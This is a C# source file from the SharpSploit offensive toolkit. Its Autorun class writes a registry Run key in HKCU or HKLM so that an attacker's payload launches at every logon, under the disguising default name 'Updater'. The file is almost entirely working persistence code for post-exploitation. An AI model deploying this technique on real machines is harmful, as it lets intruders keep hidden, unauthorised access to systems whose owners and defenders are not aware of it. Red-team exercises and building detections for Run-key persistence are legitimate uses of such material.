// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using Win = Microsoft.Win32;

using SharpSploit.Enumeration;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// Autorun is a class for abusing the Windows Registry to establish peristence.
    /// </summary>
    public class Autorun
    {
        /// <summary>
        /// Installs an autorun value in HKCU or HKLM to execute a payload.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>True if execution succeeds, false otherwise.</returns>
        /// <param name="TargetHive">Target hive to install autorun. CurrentUser or LocalMachine.</param>
        /// <param name="Value">Value to set in the registry.</param>
        /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
        public static bool InstallAutorun(Win.RegistryHive TargetHive, string Value, string Name = "Updater")
        {
            try
            {
                if (TargetHive == Win.RegistryHive.CurrentUser || TargetHive == Win.RegistryHive.LocalMachine)
                {
                    return Registry.SetRegistryKey(TargetHive, @"Software\Microsoft\Windows\CurrentVersion\Run", Name, Value, Win.RegistryValueKind.ExpandString);
                }
                Console.Error.WriteLine("Error: TargetHive must be CurrentUser or LocalMachine.");
            }
            catch (Exception e)
            {
                Console.Error.WriteLine($"Error: {e.Message}");
            }
            return false;
        }

        /// <summary>
        /// Installs an autorun value in HKCU or HKLM to execute a payload.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>True if execution succeeds, false otherwise.</returns>
        /// <param name="TargetHive">Target hive to install autorun. CurrentUser or LocalMachine.</param>
        /// <param name="Value">Value to set in the registry.</param>
        /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
        public static bool InstallAutorun(string TargetHive, string Value, string Name = "Updater")
        {
            return InstallAutorun(Registry.ConvertToRegistryHive(TargetHive), Value, Name);
        }
    }
}
